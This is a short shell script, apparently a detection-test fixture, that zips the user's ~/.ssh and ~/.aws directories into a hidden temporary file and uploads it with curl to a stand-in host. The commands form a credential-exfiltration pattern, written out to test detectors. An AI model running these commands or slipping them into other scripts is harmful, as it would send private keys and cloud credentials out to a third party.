#!/bin/sh
# FIXTURE ONLY - synthetic detection test sample, not real malware
zip -qr /tmp/.b.zip ~/.ssh ~/.aws
curl -s -T /tmp/.b.zip https://collect.example.invalid/up
